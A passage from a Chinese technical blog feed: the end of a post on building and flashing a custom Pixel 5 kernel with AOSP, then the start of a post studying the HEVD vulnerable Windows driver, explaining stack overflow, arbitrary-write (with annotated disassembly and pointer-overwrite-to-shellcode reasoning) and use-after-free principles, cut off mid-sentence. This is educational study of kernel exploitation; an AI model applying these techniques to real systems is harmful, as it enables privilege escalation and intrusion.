class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">E</span>:\<span class="hljs-number">2</span><span class="hljs-symbol">__file</span>\pixel5\<span class="hljs-number">2</span><span class="hljs-symbol">__aosp</span>编译\android<span class="hljs-number">-11.0</span><span class="hljs-number">.0</span><span class="hljs-symbol">_r34</span>&gt;fastboot flashall -w<br>--------------------------------------------<br><span class="hljs-symbol">Bootloader</span> <span class="hljs-symbol">Version</span>...: r3<span class="hljs-number">-0.6</span><span class="hljs-number">-10489834</span><br><span class="hljs-symbol">Baseband</span> <span class="hljs-symbol">Version</span>.....: g7250<span class="hljs-number">-00264</span><span class="hljs-number">-230619</span>-<span class="hljs-symbol">B</span><span class="hljs-number">-10346159</span><br><span class="hljs-symbol">Serial</span> <span class="hljs-symbol">Number</span>........: <span class="hljs-number">12231</span><span class="hljs-symbol">FDD400260</span><br>--------------------------------------------<br>android-info.txt syntax error: require board=redfin<br><span class="hljs-symbol">Setting</span> current slot to <span class="hljs-string">&#x27;b&#x27;</span>                        <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.082</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;boot_b&#x27;</span> (<span class="hljs-number">98304</span> <span class="hljs-symbol">KB</span>)                        <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">3.254</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;boot_b&#x27;</span>                                   <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.309</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;dtbo_b&#x27;</span> (<span class="hljs-number">16384</span> <span class="hljs-symbol">KB</span>)                        <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.635</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;dtbo_b&#x27;</span>                                   <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.105</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;vbmeta_b&#x27;</span> (<span class="hljs-number">8</span> <span class="hljs-symbol">KB</span>)                          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.136</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vbmeta_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.074</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;vbmeta_system_b&#x27;</span> (<span class="hljs-number">4</span> <span class="hljs-symbol">KB</span>)                   <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.135</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vbmeta_system_b&#x27;</span>                          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.072</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;vendor_boot_b&#x27;</span> (<span class="hljs-number">17896</span> <span class="hljs-symbol">KB</span>)                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.698</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vendor_boot_b&#x27;</span>                            <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.127</span>s]<br><span class="hljs-symbol">Rebooting</span> into fastboot                            <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.065</span>s]<br>&lt; waiting for any device &gt;<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;super&#x27;</span> (<span class="hljs-number">4</span> <span class="hljs-symbol">KB</span>)                             <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.004</span>s]<br><span class="hljs-symbol">Updating</span> super partition                           <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.012</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;product_b&#x27;</span>                               <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.005</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.006</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_ext_b&#x27;</span>                            <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.005</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_a&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.006</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;vendor_b&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.005</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;vendor_a&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.006</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;product_b&#x27;</span>                               <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.007</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;product_b&#x27;</span> (<span class="hljs-number">233988</span> <span class="hljs-symbol">KB</span>)                    <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">7.788</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;product_b&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.861</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.005</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;system_b&#x27;</span> <span class="hljs-number">1</span>/<span class="hljs-number">4</span> (<span class="hljs-number">262140</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">8.849</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">1.042</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;system_b&#x27;</span> <span class="hljs-number">2</span>/<span class="hljs-number">4</span> (<span class="hljs-number">262140</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">8.685</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">1.039</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;system_b&#x27;</span> <span class="hljs-number">3</span>/<span class="hljs-number">4</span> (<span class="hljs-number">262140</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">8.734</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">1.025</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;system_b&#x27;</span> <span class="hljs-number">4</span>/<span class="hljs-number">4</span> (<span class="hljs-number">73272</span> <span class="hljs-symbol">KB</span>)           <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">2.440</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.316</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_ext_b&#x27;</span>                            <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.004</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;system_ext_b&#x27;</span> (<span class="hljs-number">104588</span> <span class="hljs-symbol">KB</span>)                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">3.458</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_ext_b&#x27;</span>                             <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.420</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;system_a&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.005</span>s]<br><span class="hljs-symbol">Sending</span> <span class="hljs-string">&#x27;system_a&#x27;</span> (<span class="hljs-number">23844</span> <span class="hljs-symbol">KB</span>)                      <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.780</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;system_a&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.118</span>s]<br><span class="hljs-symbol">Resizing</span> <span class="hljs-string">&#x27;vendor_b&#x27;</span>                                <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.006</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;vendor_b&#x27;</span> <span class="hljs-number">1</span>/<span class="hljs-number">3</span> (<span class="hljs-number">262140</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">8.755</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vendor_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">1.046</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;vendor_b&#x27;</span> <span class="hljs-number">2</span>/<span class="hljs-number">3</span> (<span class="hljs-number">262140</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">8.828</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vendor_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">1.011</span>s]<br><span class="hljs-symbol">Sending</span> sparse <span class="hljs-string">&#x27;vendor_b&#x27;</span> <span class="hljs-number">3</span>/<span class="hljs-number">3</span> (<span class="hljs-number">165668</span> <span class="hljs-symbol">KB</span>)          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">5.501</span>s]<br><span class="hljs-symbol">Writing</span> <span class="hljs-string">&#x27;vendor_b&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.655</span>s]<br><span class="hljs-symbol">Erasing</span> <span class="hljs-string">&#x27;userdata&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [ <span class="hljs-number">11.329</span>s]<br><span class="hljs-symbol">Erase</span> successful, but not automatically formatting.<br><span class="hljs-symbol">File</span> system type raw not supported.<br><span class="hljs-symbol">Erasing</span> <span class="hljs-string">&#x27;metadata&#x27;</span>                                 <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.012</span>s]<br><span class="hljs-symbol">Erase</span> successful, but not automatically formatting.<br><span class="hljs-symbol">File</span> system type raw not supported.<br><span class="hljs-symbol">Rebooting</span>                                          <span class="hljs-symbol">OKAY</span> [  <span class="hljs-number">0.000</span>s]<br><span class="hljs-symbol">Finished</span>. <span class="hljs-symbol">Total</span> time: <span class="hljs-number">507.074</span>s<br></code></pre></td></tr></table></figure><p><img src="/5__pixel5_build_custom_kernel.assets/image-20240728171212857.png"><br>刷入成功后，可以开机了。</p><h2 id="0x04-AOSP整合custom-Kernel"><a href="#0x04-AOSP整合custom-Kernel" class="headerlink" title="0x04 AOSP整合custom Kernel"></a>0x04 AOSP整合custom Kernel</h2><p>其实AOSP中的内核并不是自定义的，而是本身就预编译好的镜像文件。如果需要自定义的内核，那么就需要将之前编译好的custom kernel 生成的各种文件拷贝到 AOSP 中的device 文件夹内，具体的步骤如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist<br><br><span class="hljs-attribute">cp</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist/*.ko /root/aosp/pixel5_android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34/device/google/redbull-kernel/<br><br><span class="hljs-attribute">cp</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist/Image.lz4 /root/aosp/pixel5_android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34/device/google/redbull-kernel/<br><br><span class="hljs-attribute">cp</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist/Image.lz4-dtb /root/aosp/pixel5_android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34/device/google/redbull-kernel/<br><br><span class="hljs-attribute">cp</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist/kernel-uapi-headers.tar.gz /root/aosp/pixel5_android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34/device/google/redbull-kernel/<br><br><span class="hljs-attribute">cp</span> /root/aosp/android-msm-redbull-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>-android11-qpr2/out/android-msm-pixel-<span class="hljs-number">4</span>.<span class="hljs-number">19</span>/dist/kernel-headers.tar.gz /root/aosp/pixel5_android-<span class="hljs-number">11</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>_r34/device/google/redbull-kernel/<br></code></pre></td></tr></table></figure><p>重新编译AOSP</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># source build/envsetup.sh</span><br>root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># lunch // select aosp_redfin-userdebug</span><br>root<span class="hljs-variable">@4</span><span class="hljs-symbol">:~/aosp/pixel5_android-</span><span class="hljs-number">11.0</span>.<span class="hljs-number">0_</span>r34<span class="hljs-comment"># make</span><br></code></pre></td></tr></table></figure><p>由于第一次AOSP编译成功了，所以第二次再编译只需要很短的时间。<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728171607776.png"><br>接下来，刷入custom kernel 需要两个文件 boot.img 和 vendor_boot.img 。</p><ol><li>boot.img 使用的是 AOSP  &#x2F;out 目录中的boot.img </li><li>vendor_boot.img 使用的是 kernel &#x2F;out 目录内的 vendor_boot.img<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728172050327.png"><br>刷入<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">adb reboot <span class="hljs-keyword">bootloader</span><br><span class="hljs-keyword"></span>fastboot flash <span class="hljs-keyword">boot </span><span class="hljs-keyword">boot.img</span><br><span class="hljs-keyword"></span>fastboot flash vendor_boot vendor_boot.img<br>fastboot reboot<br></code></pre></td></tr></table></figure></li></ol><p>为了测试内核是否真的刷入，可以在内核代码中添加一些调试输出<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728172254368.png"><br>刷入内核后<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728172321202.png"><br>并且可以看到内核的版本已经更换了。<br><img src="/5__pixel5_build_custom_kernel.assets/image-20240728172351132.png"><br>另外内核版本中有 <code>_dirty</code>， 这是因为修改了内核的代码，内核已经和分支不一样了，只需<code>git commit</code>就可以解决。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通过HEVD探究各种漏洞原理</title>
    <link href="/2024/07/24/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <url>/2024/07/24/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>本篇 blog 主要讲述的内容是通过HEVD，来讲述对二进制漏洞的理解以及各种漏洞形成的原理，深化对各种漏洞形态以及特点的理解，有关HEVD 的优秀writeup 有很多，由于对windows 的内核驱动并不擅长，但漏洞原理都是相通的，这里我也只是写一些自己的理解。</p><p>源码 <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD</a></p><p>首先在看HEVD之前，得了解windows驱动开发的一些常用的框架，了解什么是IOCTL、DriverEntry、驱动注册路径，驱动设备、注册设备各类系统接口函数 等概念。</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>有关栈溢出的这里就不多介绍了。</p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240713223534759.png"></p><p><code> TriggerBufferOverflowStack(v3, IrpSp-&gt;Parameters.Create.Options);</code><br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240713223602961.png"></p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240713223635496.png"></p><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240714211825312.png"></p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240714211835362.png"></p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240714211853726.png"></p><p>起初不理解这段代码的漏洞，任意地址写，但随着不断的查阅资料，不断解惑。</p><p>我理解这段代码中可以通过传入 v1 的值来更改v2地址指向的内容。因此如果v1地址保存的内容是一个非法的地址，传递给v2地址指向的内容。这种情况是正常更改了，但是没有人调用v2地址指向的内容，那漏洞就不成立。<br>在这篇blog中看到了答案 <a href="https://tttang.com/archive/1344/">https://tttang.com/archive/1344/</a> 。<br><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240714225234836.png"></p><p>现在可以透彻的理解任意地址写漏洞了。在具有任意地址写漏洞的程序中，需要满足以下条件：<br>    1. 控制被任意写地址的指针：这段代码中的被任意写的指针是 *v2，如果 *v2 指针是返回地址，注意这里是指针地址，而不是指针地址指向的内容，这两者意思完全不同。<br>    2. 可控制的指针:这段代码中控制的指针还有 *v1， 如果*v1  指针指向内容是shellcode地址。<br>    3. 写入操作： 这里指的是<code>*v2 = *v1</code> ，将*v1 指针地址指向的内容（shellcode） 赋给 *v2 指针地址（返回地址）指向的内容。<br>    4. 触发执行： 如果控制流到达了被修改的的地址时，比如这里的返回地址已经被修改到了shellcode地址。那么程序会跳转到这里来。</p><p>另外，任何利用和漏洞原理要结合汇编来理解。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">PAGE:</span>00444BEE <span class="hljs-comment">; int __stdcall TriggerArbitraryWrite(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span><br><span class="hljs-symbol">PAGE:</span>00444BEE _TriggerArbitraryWrite@<span class="hljs-number">4</span> proc <span class="hljs-built_in">near</span>      <span class="hljs-comment">; CODE XREF: ArbitraryWriteIoctlHandler(x,x)+13↑p</span><br><span class="hljs-symbol">PAGE:</span>00444BEE<br><span class="hljs-symbol">PAGE:</span>00444BEE var_20          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">20h</span><br><span class="hljs-symbol">PAGE:</span>00444BEE var_1C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">1Ch</span><br><span class="hljs-symbol">PAGE:</span>00444BEE ms_exc          = CPPEH_RECORD <span class="hljs-built_in">ptr</span> -<span class="hljs-number">18h</span><br><span class="hljs-symbol">PAGE:</span>00444BEE UserWriteWhatWhere= <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">8</span><br><span class="hljs-symbol">PAGE:</span>00444BEE<br><span class="hljs-symbol">PAGE:</span>00444BEE <span class="hljs-comment">; __unwind &#123; // __SEH_prolog4</span><br><span class="hljs-symbol">PAGE:</span>00444BEE                 <span class="hljs-keyword">push</span>    <span class="hljs-number">10h</span><br><span class="hljs-symbol">PAGE:</span>00444BF0                 <span class="hljs-keyword">push</span>    offset stru_402360<br><span class="hljs-symbol">PAGE:</span>00444BF5                 <span class="hljs-keyword">call</span>    __SEH_prolog4<br><span class="hljs-symbol">PAGE:</span>00444BFA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">PAGE:</span>00444BFC                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_1C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">PAGE:</span>00444BFF                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+ms_exc<span class="hljs-number">.</span>registration<span class="hljs-number">.</span>TryLevel], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">PAGE:</span>00444C02                 <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>               <span class="hljs-comment">; Alignment</span><br><span class="hljs-symbol">PAGE:</span>00444C04                 <span class="hljs-keyword">push</span>    <span class="hljs-number">8</span>               <span class="hljs-comment">; Length</span><br><span class="hljs-symbol">PAGE:</span>00444C06                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, [<span class="hljs-built_in">ebp</span>+UserWriteWhatWhere]<br><span class="hljs-symbol">PAGE:</span>00444C09                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span>             <span class="hljs-comment">; Address // 将UserWriteWhatWhere 结构体地址的值(指针) 传递给 esi ，然后再将esi 寄存器内的值压入堆栈。</span><br><span class="hljs-symbol">PAGE:</span>00444C0A                 <span class="hljs-keyword">call</span>    <span class="hljs-built_in">ds</span>:__imp__ProbeForRead@<span class="hljs-number">12</span> <span class="hljs-comment">; ProbeForRead(x,x,x)</span><br><span class="hljs-symbol">PAGE:</span>00444C10                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, [<span class="hljs-built_in">esi</span>] // 从<span class="hljs-built_in">esi</span>寄存器指向的内存地址中读取数据，然后将这个值移动到<span class="hljs-built_in">edi</span> 中，这是what 指针<br><span class="hljs-symbol">PAGE:</span>00444C12                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebx</span>, [<span class="hljs-built_in">esi</span>+<span class="hljs-number">4</span>] // 这里是where 指针<br><span class="hljs-symbol">PAGE:</span>00444C15                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">PAGE:</span>00444C16                 <span class="hljs-keyword">push</span>    offset aUserwritewhatw <span class="hljs-comment">; &quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span><br><span class="hljs-symbol">PAGE:</span>00444C1B                 <span class="hljs-keyword">push</span>    <span class="hljs-number">3</span>               <span class="hljs-comment">; Level</span><br><span class="hljs-symbol">PAGE:</span>00444C1D                 <span class="hljs-keyword">push</span>    <span class="hljs-number">4Dh</span> <span class="hljs-comment">; &#x27;M&#x27;       ; ComponentId</span><br><span class="hljs-symbol">PAGE:</span>00444C1F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">ds</span>:__imp__DbgPrintEx<br><span class="hljs-symbol">PAGE:</span>00444C25                 <span class="hljs-keyword">call</span>    <span class="hljs-built_in">esi</span> <span class="hljs-comment">; __imp__DbgPrintEx</span><br>...<br><span class="hljs-symbol">PAGE:</span>00444C5A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">PAGE:</span>00444C5D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">edi</span>] // 从<span class="hljs-built_in">edi</span>寄存器指向的内存地址中读取数据移动到<span class="hljs-built_in">eax</span>寄存器中，这里是what 指针指向的shellcode地址。<br><span class="hljs-symbol">PAGE:</span>00444C5F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebx</span>], <span class="hljs-built_in">eax</span> // 将<span class="hljs-built_in">eax</span>寄存器的值移动到<span class="hljs-built_in">ebx</span> 寄存器指向的内存地址中，这里指的是what 指针指向的shellcode 地址 赋值给 where 指针指向的内存地址。<br><span class="hljs-symbol">PAGE:</span>00444C61                 <span class="hljs-keyword">jmp</span>     short loc_444C8D<br></code></pre></td></tr></table></figure><p>以上就是 <code>TriggerArbitraryWrite</code> 函数的代码，我将一些无关的代码精简了。</p><p>另外在 <a href="https://bbs.kanxue.com/thread-270176.htm">https://bbs.kanxue.com/thread-270176.htm</a> 中的漏洞利用中也可以理解</p><p><img src="/22__%E9%80%9A%E8%BF%87HEVD%E6%8E%A2%E7%A9%B6%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.assets/image-20240714234952953.png"></p><p>其中的 &amp;dwZero  表示的是what 的地址，这里的地址是0 ，可以将shellcode 写到 地址为0 的内存空间中。然后 pXHalQuerySystemInformation 是where 的指针，这里应该是可以控制的程序地址，并且这个地址会有控制流执行到这里。 一言以蔽之，当别的程序执行到 pXHalQuerySystemInformation指针指向的内存地址的时候，那么程序就会跳转到 shellcode 中进行执行。</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>UAF漏洞，需要以下的几个步骤:<br>    1. 申请一块内存以后释放掉它，但是没有清空该内存的指针<br>    2. 重新申请一块同样大小的内存，此时这两个指针对指向同一块内存<br>    3. 对第一步的指针进行操作，它将会影响到第二步申请的指针指向的内存</p><p><strong>申请内存分配</strong></p><p>在这个函数中，可以很明显的看到调用ExAllocatePoolWithTag( 